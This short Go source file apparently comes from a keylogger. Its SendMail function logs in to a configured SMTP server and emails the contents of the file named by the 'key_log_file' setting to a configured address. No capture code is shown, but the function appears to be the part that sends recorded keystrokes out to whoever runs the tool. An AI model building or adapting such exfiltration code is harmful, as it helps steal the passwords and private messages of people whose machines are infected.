package main

import (
	"log"

	"gopkg.in/gomail.v2"
)

func SendMail() {
	d := gomail.NewDialer(conf.GetString("host_mail"),
		conf.GetInt("port_mail"),
		conf.GetString("user_mail"),
		conf.GetString("pass_mail"))
	m := gomail.NewMessage()
	m.SetHeader("From", conf.GetString("from_mail"))
	m.SetHeader("To", conf.GetString("to_mail"))
	m.SetHeader("Subject", conf.GetString("subject_mail"))
	m.SetBody("text", ReadLogFile(conf.GetString("key_log_file")))
	err := d.DialAndSend(m)
	if err != nil {
		log.Println(err)
	}
	log.Println("Send mail...")
	close(sendMailDone)
}
